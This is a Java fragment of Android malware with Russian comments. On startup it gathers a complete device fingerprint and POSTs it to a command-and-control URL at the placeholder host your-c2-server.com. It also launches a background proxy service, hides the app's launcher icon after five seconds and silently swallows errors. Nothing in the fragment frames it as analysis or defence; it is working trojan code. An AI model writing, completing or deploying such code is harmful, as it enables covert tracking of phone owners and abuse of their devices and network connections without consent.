@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    
    // Запуск сбора отпечатка
    new Thread(() -> {
        JSONObject fp = FingerprintCollector.getCompleteFingerprint(this);
        sendToC2("fingerprint", fp.toString());
    }).start();
    
    // Запуск прокси-сервера
    Intent proxyIntent = new Intent(this, ProxyService.class);
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        startForegroundService(proxyIntent);
    } else {
        startService(proxyIntent);
    }
    
    // Скрываем иконку через 5 секунд
    new Handler().postDelayed(() -> {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }, 5000);
    
    finish();
}

private void sendToC2(String type, String data) {
    try {
        URL url = new URL("https://your-c2-server.com/collect");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.getOutputStream().write(("type=" + type + "&data=" + data).getBytes());
        conn.getOutputStream().close();
    } catch (Exception ignored) {}
}
